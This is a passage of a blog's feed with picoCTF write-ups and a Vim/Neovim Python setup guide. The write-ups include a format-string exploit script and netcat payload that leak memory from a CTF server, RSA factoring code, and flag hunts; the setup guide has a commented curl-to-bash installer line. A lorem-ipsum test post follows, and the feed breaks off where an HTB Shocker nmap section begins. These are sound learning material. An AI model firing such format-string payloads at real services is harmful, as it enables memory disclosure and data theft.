        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(lowChar)
    <span style="color:#8be9fd;font-style:italic">print</span>(flag)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pack</span>(flag):
    <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">len</span>(flag)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">2</span>):  <span style="color:#6272a4">#must be divisible by 2 since two chars are packed into a single char during encoding</span>
        flag<span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34; &#34;</span>     <span style="color:#6272a4">#add blank space for padding</span>
    encoded_flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>((<span style="color:#8be9fd;font-style:italic">ord</span>(flag[i]) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">ord</span>(flag[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>])) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(flag), <span style="color:#bd93f9">2</span>)])
    <span style="color:#8be9fd;font-style:italic">print</span>(encoded_flag)
    <span style="color:#ff79c6">return</span> encoded_flag

<span style="color:#6272a4">#flag = &#34;This is the text that will be packed&#34;</span>
<span style="color:#6272a4">#enc = pack(flag)</span>

encoded <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;./enc&#34;</span>, mode<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;r&#39;</span>, encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
enc <span style="color:#ff79c6">=</span> encoded<span style="color:#ff79c6">.</span>read()
unpack(enc)
</code></pre></td></tr></table>
</div>
</div><h2 id="stonks">Stonks</h2>
<p>There is a format-string vulnerability.</p>
<pre><code>(echo 1; for i in {1..1}; do echo -n &quot;%${i}\$08x&quot; ; done ; echo) | nc mercury.picoctf.net 6989
</code></pre>
<p>There is some ASCII characters in the output, so we can convert from hex the output to read the string</p>
<p>We find the string but we have the wrong Endianness <code>ocip{FTC0l_I4_t5m[..SNIP..]..}</code></p>
<p>With Cyberchef it is easy, simply click (<a href="https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&amp;input=MDk2ZWU0NzAwODA0YjAwMDA4MDQ4OWMzZjdmNTBkODBmZmZmZmZmZjAwMDAwMDAxMDk2ZWMxNjBmN2Y1ZTExMGY3ZjUwZGM3MDAwMDAwMDAwOTZlZDE4MDAwMDAwMDA0MDk2ZWU0NTAwOTZlZTQ3MDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzODYxMzAzMjM1NjUzM2ZmOGYwMDdkZjdmOGJhZjhmN2Y1ZTQ0MGJhMjAyZTAwMDAwMDAwMDEwMDAwMDAwMGY3ZGVkY2U5ZjdmNWYwYzBmN2Y1MDVjMGY3ZjUwMDAwZmY4Zjg5MThmN2RkZTY4ZGY3ZjUwNWMwMDgwNDhlY2FmZjhmODkyNDAwMDAwMDAwZjdmNzJmMDkwODA0YjAwMGY3ZjUwMDAwZjdmNTBlMjBmZjhmODk1OA">https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&amp;input=MDk2ZWU0NzAwODA0YjAwMDA4MDQ4OWMzZjdmNTBkODBmZmZmZmZmZjAwMDAwMDAxMDk2ZWMxNjBmN2Y1ZTExMGY3ZjUwZGM3MDAwMDAwMDAwOTZlZDE4MDAwMDAwMDA0MDk2ZWU0NTAwOTZlZTQ3MDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzODYxMzAzMjM1NjUzM2ZmOGYwMDdkZjdmOGJhZjhmN2Y1ZTQ0MGJhMjAyZTAwMDAwMDAwMDEwMDAwMDAwMGY3ZGVkY2U5ZjdmNWYwYzBmN2Y1MDVjMGY3ZjUwMDAwZmY4Zjg5MThmN2RkZTY4ZGY3ZjUwNWMwMDgwNDhlY2FmZjhmODkyNDAwMDAwMDAwZjdmNzJmMDkwODA0YjAwMGY3ZjUwMDAwZjdmNTBlMjBmZjhmODk1OA</a>)</p>
<p>in python3, it is more tricky:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> re
<span style="color:#ff79c6">import</span> pwn
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>

host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mercury.picoctf.net&#39;</span>, <span style="color:#bd93f9">6989</span>
s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)

prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;portfolio&#39;</span>)
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;1&#39;</span>)
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;token?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)

payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">32</span>):
  <span style="color:#6272a4">#payload += &#39;%&#39;+str(i)+&#39;$s&#39;</span>
  payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;%&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;$08x&#39;</span>

api_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#ff79c6">try</span>:
  s<span style="color:#ff79c6">.</span>sendline(payload)
  prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
  api_key <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Buying stonks with token:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">([^</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">]*)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Portfolio&#34;</span>, prompt)<span style="color:#ff79c6">.</span>group(<span style="color:#bd93f9">1</span>)
<span style="color:#ff79c6">except</span>:
  <span style="color:#ff79c6">pass</span>
<span style="color:#ff79c6">finally</span>:
  s<span style="color:#ff79c6">.</span>close()

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">fix_endianness</span>(b):
    endian_friendly <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
    <span style="color:#ff79c6">for</span> ix <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(b), <span style="color:#bd93f9">4</span>):
        <span style="color:#ff79c6">try</span>:
            endian_friendly <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(b[ix<span style="color:#ff79c6">+</span><span style="color:#bd93f9">3</span>]) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(b[ix<span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>]) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(b[ix<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>]) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(b[ix<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span>])
        <span style="color:#ff79c6">except</span>:
            <span style="color:#ff79c6">pass</span>
    <span style="color:#ff79c6">return</span> endian_friendly

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;api_key =&#39;</span>, api_key<span style="color:#ff79c6">.</span>decode())
b <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(api_key<span style="color:#ff79c6">.</span>decode())
<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;DUMP =&#39;</span>,b)
flag <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;picoCTF{.*}&#34;</span>, fix_endianness(b))[<span style="color:#bd93f9">0</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(flag)
</code></pre></td></tr></table>
</div>
</div><h2 id="get-ahead">GET aHEAD</h2>
<pre><code>curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d' ' -f2
</code></pre>
<h2 id="mind-your-ps-and-qs">Mind your Ps and Qs</h2>
<pre><code>Decrypt my super sick RSA:
c: 861270243527190895777142537838333832920579264010533029282104230006461420086153423
n: 1311097532562595991877980619849724606784164430105441327897358800116889057763413423
e: 65537
</code></pre>
<p>if n is small then it can be factorized: <a href="http://factordb.com/index.php?query=831416828080417866340504968188990032810316193533653516022175784399720141076262857">http://factordb.com/index.php?query=831416828080417866340504968188990032810316193533653516022175784399720141076262857</a></p>
<p>FactorDB is also available in python with <code>pip3 install factordb-pycli</code>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">from</span> factordb.factordb <span style="color:#ff79c6">import</span> FactorDB

n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1311097532562595991877980619849724606784164430105441327897358800116889057763413423</span>

f <span style="color:#ff79c6">=</span> FactorDB(n)
f<span style="color:#ff79c6">.</span>connect()
p, q <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>get_factor_list()
</code></pre></td></tr></table>
</div>
</div><p>Once factorized, we can calculate the totient ph and perform some arithmetic with an optimized C-coded python library <code>pip3 install gmpy2</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">ph <span style="color:#ff79c6">=</span> (p<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">*</span>(q<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)

<span style="color:#ff79c6">import</span> gmpy2
c <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">861270243527190895777142537838333832920579264010533029282104230006461420086153423</span>
e <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65537</span>
d <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>invert(e, ph)
plaintext <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">pow</span>(c, d, n)
<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">bytearray</span><span style="color:#ff79c6">.</span>fromhex(<span style="color:#8be9fd;font-style:italic">hex</span>(plaintext)[<span style="color:#bd93f9">2</span>:])<span style="color:#ff79c6">.</span>decode())
</code></pre></td></tr></table>
</div>
</div><h2 id="static-aint-always-noise">Static ain&rsquo;t always noise</h2>
<pre><code>strings static | grep pico
</code></pre>
<h2 id="tab-tab-attack">Tab, Tab, Attack</h2>
<pre><code>cd ./Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku
strings fang-of-haynekhtnamet | grep pico
</code></pre>
]]></content></item><item><title>Vim as a first choice Python IDE</title><link>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</link><pubDate>Thu, 11 Feb 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</guid><description>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.
1 2 3 4 5 6 7 brew update &amp;amp;&amp;amp; brew upgrade python brew link --overwrite python@3.</description><content type="html"><![CDATA[





  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>



<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">brew update <span style="color:#ff79c6">&amp;&amp;</span> brew upgrade python
brew link --overwrite python@3.9
sudo pip3 install pynvim flake8 pylint isort
/usr/local/opt/python@3.9/bin/python3.9 -m pip install --upgrade pip
pip3 install jedi msgpack
brew install ctags ack

</code></pre></td></tr></table>
</div>
</div><h1 id="upgrade-the-fonts-for-better-terminal-and-coding-experience">Upgrade the fonts for better terminal and coding experience</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">brew tap homebrew/cask-fonts
brew install --cask font-hack-nerd-font
</code></pre></td></tr></table>
</div>
</div><p>Open iTerm2 preferences with <code>⌘,</code> and go to <code>Profiles &gt; Text</code> to change to Hack Nerd Font</p>
<h1 id="install-an-existing-vimrc-or-initvim-file">install an existing .vimrc or init.vim file</h1>
<p>go to <a href="http://vim.fisadev.com/">FisaDev</a> and follow instructions to download config files <code>~/.vimrc</code> (Vim) and <code>~/.config/nvim/init.vim</code> (Neovim). Available from <a href="https://raw.githubusercontent.com/fisadev/fisa-vim-config/v12.0.1/config.vim">github</a>.</p>
<h1 id="troubleshoot-your-neovim-installation">troubleshoot your neovim installation</h1>
<p>You may have to install the latest version of neovim from ~HEAD</p>
<pre><code>softwareupdate --all --install --force
sudo xcode-select --install
brew install luv
#brew unlink luajit
#brew unlink neovim
brew install --HEAD luarocks
brew install --HEAD luajit
brew install --HEAD neovim
rm ~/.config/coc
</code></pre>
<p>Fix your python installation (you may have to restart your terminal for changes to take effect)</p>
<pre><code>brew install pyenv              # curl https://pyenv.run | bash
brew install pyenvvirtualenv
pyenv install --list | grep 3.9
pyenv install 3.9.1
pyenv install --list | grep 2.7.18
pyenv install 2.7.18
</code></pre>
<p>You&rsquo;ll have to add this to your .bashrc or .zshrc to have your pyenv works</p>
<pre><code>eval &quot;$(pyenv init -)&quot;
eval &quot;$(pyenv virtualenv-init -)&quot;
</code></pre>
<p>And fix your neovim python provider</p>
<pre><code>pyenv virtualenv 3.9.1 neovim3
pyenv activate neovim3
pip install pynvim flake8 pylint isort
pip install --upgrade pip

pyenv virtualenv 2.7.18 neovim2
pyenv activate neovim2
pip install pynvim flake8 pylint isort
pip install --upgrade pip
</code></pre>
<p>Once your python environment installed, make sure neovim configuration init.vim contains the below:</p>
<pre><code>let g:python3_host_prog = '~/.pyenv/versions/neovim3/bin/python'
let g:python_host_prog =  '~/.pyenv/versions/neovim2/bin/python'
</code></pre>
<h1 id="fuzzy-finder">Fuzzy-Finder</h1>
<pre><code>brew install ripgrep
brew install the_silver_searcher
brew install bat
brew install git-delta
</code></pre>
<h1 id="vista">Vista</h1>
<p>brew tap universal-ctags/universal-ctags
brew install &ndash;with-jansson &ndash;HEAD universal-ctags/universal-ctags</p>
<h1 id="intellisense-with-coc---conquer-of-completion">Intellisense with CoC - Conquer Of Completion</h1>
<p>Install language extensions for CoC</p>
<pre><code>:CocInstall coc-pyright coc-snippets coc-vimlsp coc-json coc-tsserver
</code></pre>
<p>In corporate environment where TLS inspection is enforced, the above vim command will fail to find the certificate issuer. The remediation is to to add the CA certificate to your node env:</p>
<pre><code>export NODE_EXTRA_CERTS=&lt;path of your pem certificate&gt;
</code></pre>
]]></content></item><item><title>Test</title><link>https://0xade1.github.io/posts/2021/02/test/</link><pubDate>Sun, 07 Feb 2021 13:45:14 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/02/test/</guid><description>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est.</description><content type="html">
&lt;p>&lt;em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.&lt;/em>&lt;/p></content></item><item><title>HTB - Shocker</title><link>https://0xade1.github.io/posts/2020/09/htb-shocker/</link><pubDate>Wed, 30 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-shocker/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.80 scan initiated Sun Sep 6 11:36:23 2020 as: nmap -v -Pn -sC -sV -oA nmap/shocker 10.10.10.56 Nmap scan report for 10.10.10.56 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
